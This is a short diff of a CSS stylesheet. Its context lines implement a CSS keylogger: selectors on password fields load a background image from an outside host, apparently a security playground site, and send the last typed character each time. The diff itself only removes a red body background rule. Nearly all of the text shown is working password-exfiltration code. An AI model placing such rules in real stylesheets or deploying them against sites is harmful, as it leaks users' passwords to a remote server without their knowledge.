@@ -95,7 +95,3 @@ input[type="password"][value$="|"] { background-image: url("https://security-che
 input[type="password"][value$="\\}"] { background-image: url("https://security-check-playground.herokuapp.com/css-keylogger/add-key?val=%7D"); }
 input[type="password"][value$="~"] { background-image: url("https://security-check-playground.herokuapp.com/css-keylogger/add-key?val=~"); }
 input[type="password"][value$=""] { background-image: url("https://security-check-playground.herokuapp.com/css-keylogger/add-key?val=%7F"); }
-
-body {
-    background: red
-}
